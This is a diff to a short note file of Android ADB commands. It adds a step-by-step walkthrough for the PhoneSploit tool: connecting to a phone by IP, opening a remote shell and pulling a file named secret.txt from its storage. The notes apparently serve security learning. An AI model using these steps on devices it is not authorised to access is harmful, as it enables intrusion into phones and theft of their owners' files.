@@ -18,3 +18,34 @@ adb shell
 # Download a File from Android using ADB tool
 adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
 adb pull sdcard/log.txt /home/mmurphy/Desktop
+
+
+---------------------------------------------------------------------------------
+
+#PhoneSploit
+
+
+python3 phonesploit.py
+
+# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
+# Type 4, to Access Shell on phone
+
+pwd
+ls
+cd sdcard
+ls
+cd Download
+
+#Download File using PhoneSploit
+9. Pull Folders 
+
+Enter the Full Path of file to Download
+sdcard/Download/secret.txt
+
+
+
+
+
+
+
+
